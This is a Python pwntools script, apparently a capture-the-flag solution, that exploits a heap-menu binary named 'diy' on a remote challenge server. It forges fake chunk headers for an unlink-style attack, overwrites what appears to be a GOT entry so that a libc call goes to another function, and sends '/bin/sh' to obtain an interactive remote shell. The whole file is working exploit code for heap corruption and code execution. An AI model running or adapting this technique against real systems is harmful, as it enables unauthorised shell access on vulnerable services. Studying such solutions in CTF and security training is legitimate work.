from pwn import *

#r = process('./diy')
r = remote('chal.420blaze.in', 42002)

def alloc(index, size):
	r.sendafter('> ', '1\n')
	r.sendafter(': ', str(index) + '\n')
	r.sendafter(': ', str(size) + '\n')
	return int(r.recvuntil('\n').split('Allocated: ')[1].split('\n')[0], 16)

def read(index):
	r.sendafter('> ', '2\n')
	r.sendafter(': ', str(index) + '\n')
	return r.recvuntil('\nWhat would you like to do?').split('\nWhat would you like to do?')[0]

def write(index, data):
	r.sendafter('> ', '3\n')
	r.sendafter(': ', str(index) + '\n')
	r.sendafter(': ', data)

def free(index):
	r.sendafter('> ', '4\n')
	r.sendafter(': ', str(index) + '\n')

print hex(alloc(0, 0x10))
print hex(alloc(1, 0x10))
print hex(alloc(2, 0x20))
print hex(alloc(3, 0x000080000000000))
test = ''
write(3, p64(0x21) + p64(0x10) + p64(0x31) + p64(0x20) + p64(0x20) + p64(0x20) + p64(0x405140-0x18) + p64(0x405140-0x10) + p64(0x21) + p64(0x20))
pause()
free(1)
write(2, 'A'*0x18 + p64(0x0000000000405058))
write(2, p64(0x0000000000401060))
r.sendafter('> ', '/bin/sh\x00')

r.interactive()
